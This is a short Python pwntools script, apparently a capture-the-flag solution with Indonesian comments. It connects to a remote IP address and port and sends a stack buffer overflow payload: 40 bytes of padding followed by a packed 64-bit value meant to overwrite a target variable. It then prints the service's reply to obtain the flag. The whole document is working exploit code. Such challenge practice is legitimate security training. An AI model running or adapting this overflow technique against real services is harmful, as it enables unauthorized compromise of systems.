from pwn import *

# Setup
IP   = '94.237.55.43'
PORT = 54429
r = remote(IP, PORT)

# Craft payload
payload  = b'A' * 32        # Buffer
payload += b'B' * 8         # Alignment
payload += p64(0x41414141)  # Nilai baru untuk target

# Send
r.sendline(payload)

# Dapatkan flag
print(r.recvall().decode())
